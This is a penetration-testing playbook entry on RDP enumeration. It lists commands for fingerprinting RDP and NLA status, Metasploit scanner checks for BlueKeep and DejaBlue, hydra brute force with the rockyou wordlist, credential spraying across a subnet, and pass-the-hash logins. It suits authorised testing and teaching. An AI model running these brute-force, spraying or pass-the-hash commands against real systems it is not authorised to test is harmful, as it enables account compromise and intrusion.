---
id: rdp-enum
title: RDP Enumeration
stage: enumeration
tags: [windows, rdp]
summary: Check NLA status, encryption level, and vulnerability to BlueKeep/DejaBlue — NLA disabled means password brute-force is viable.
leads_to:
  - rdp-access
  - password-spray
  - public-exploit
---

## Prerequisites

Port 3389 open (also check 3390, 13389). No credentials needed for fingerprinting and vulnerability scanning.

RDP enumeration tells you what you're dealing with before attempting login. NLA (Network Level Authentication) authenticates before displaying the login screen — brute-force still works but you can't see the OS. The BlueKeep/DejaBlue family of CVEs enables pre-auth RCE, but avoid running exploit modules on live targets — they crash hosts.

## Quick Win

> Fingerprint OS, NLA status, and security layer in one shot.

```bash
nxc rdp $TARGET
nmap -p3389 --script rdp-enum-encryption $TARGET
```

## Vulnerability Check

> Pre-auth RCE checks — use scanner modules only, not exploit modules in production.

```bash
# BlueKeep (CVE-2019-0708) — Windows 7 / Server 2008 R2 and earlier
nmap -p3389 --script rdp-vuln-ms12-020 $TARGET
```

```bash
# Metasploit scanners (verify only)
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS $TARGET; run

use auxiliary/scanner/rdp/cve_2019_1181_dejablue   # Windows 8+ / Server 2012+
set RHOSTS $TARGET; run
```

## Brute Force (NLA Disabled Only)

> Username + password brute — NLA must be disabled or test after NLA with known user list.

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://$TARGET -t 4
nxc rdp $TARGET -u users.txt -p passwords.txt --continue-on-success
```

## Spray Known Creds Across Subnet

> Lateral movement — try cracked or found credentials against all RDP hosts.

```bash
nxc rdp $CIDR -u administrator -p 'Password123'
nxc rdp $CIDR -u administrator -H <NTLM_hash>   # PTH — requires RestrictedAdmin mode enabled
```

## Leads To

Valid credentials → rdp-access (GUI session, clipboard, file transfer). BlueKeep/DejaBlue vulnerable → public-exploit → SYSTEM (avoid in unstable environments). Credentials confirmed → password-spray the same creds against SMB, WinRM, and web. RestrictedAdmin mode enabled → Pass-the-Hash RDP with NTLM hash.
